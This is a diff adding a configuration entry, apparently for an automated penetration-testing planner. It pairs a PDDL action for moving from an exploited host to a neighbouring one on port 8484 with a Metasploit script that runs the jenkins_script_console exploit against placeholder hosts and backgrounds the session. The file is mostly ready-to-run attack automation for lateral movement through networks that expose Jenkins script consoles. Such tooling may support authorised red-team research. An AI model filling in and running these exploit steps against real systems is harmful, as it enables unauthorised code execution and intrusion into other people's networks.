@@ -1,0 +1,29 @@
+[pddl]
+    (:action exploit/multi/http/jenkins_script_console
+        :parameters (?from ?to)
+        :precondition (and
+            (located ?from)
+            (connected ?from ?to)
+            (exploited ?from)
+            (port-8484 ?to)
+        )
+        :effect (and
+            (not (located ?from))
+            (located ?to)
+            (exploited ?to)
+        )
+    )
+
+[script]
+|> msf
+use exploit/multi/http/jenkins_script_console
+set RHOSTS {RHOSTS}
+set RPORT 8484
+set TARGETURI /script/
+set LHOST {LHOST}
+exploit -z
+
+[evc]
+
+[evd]
+LOG: Q=1, A=4
